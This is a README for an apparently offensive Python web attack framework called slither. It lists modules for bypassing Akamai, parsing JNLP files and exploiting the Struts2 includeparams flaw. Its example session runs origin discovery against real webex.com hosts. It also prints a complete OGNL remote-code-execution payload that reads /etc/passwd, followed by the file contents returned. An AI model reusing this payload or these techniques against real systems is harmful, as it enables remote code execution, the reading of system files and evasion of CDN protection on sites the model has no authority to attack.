# slither
Python Web Attack Framework
---------------------------
This framework is here to help you in your quest of conquering web applications.  It is currently very BETA, and I am adding modules slow and steadily.  Slither will contain modules to help you attack and exploit, but also handle some pretty obsecure tasks as well.

Current Modules
---------------
akaspy - Bypassing Akamai

jnlp parse - Parse a JNLP file and download the target JAR(s) for a Java Web Start RIA

struts2 params - Validate and exploit the struts2 includeparams vulnerability 

Setup
-----
Slither is written in Python3, and I would suggest setting up a virtualenv after you clone it.  You can use pip to install the requirements.txt - Once you activate the virtualenv, you're good to go!

Examples
--------

```
  _________.__   .__   __   .__
 /   _____/|  |  |__|_/  |_ |  |__    ____  _______
 \_____  \ |  |  |  |\   __\|  |  \ _/ __ \ \_  __ |
 /        \|  |__|  | |  |  |   Y  \   ___/  |  | \/
/_______  /|____/|__| |__|  |___|  / \___  > |__|
        \/                       \/      \/


    
(slither) akaspy origin-www.webex.com webex.com
>>> 2015-01-14 17:25:12,638 Retrieved An Alias! :: global-wwwprodvm.webex.com.
>>> 2015-01-14 17:25:12,640 Getting IP Address :: 173.243.5.18
>>> 2015-01-14 17:25:12,843 Origin Access Possible!

(slither) struts http://127.0.0.1:8080/example/HelloWorld.action params
>>> 2015-01-14 17:37:41,764 Checking Target :: http://127.0.0.1:8080/example/HelloWorld.action
>>> 2015-01-14 17:37:41,773 Starting new HTTP connection (1): 127.0.0.1
>>> 2015-01-14 17:37:41,860 Code Execution Possible! :: pwn
>>> 2015-01-14 17:37:41,860 Attempting Execution :: %{(#_memberAccess['allowStaticMethodAccess']=true)(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),#b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c), #e=new char[5000], #d.read(#e),#slither=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#slither.getWriter().println(#e), #slither.getWriter().flush(), #slither.getWriter().close())}
>>> 2015-01-14 17:37:41,872 Starting new HTTP connection (1): 127.0.0.1
>>> 2015-01-14 17:37:42,061 Execution Success!
>>> 2015-01-14 17:37:42,061 ##
# User Database
# 
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
```
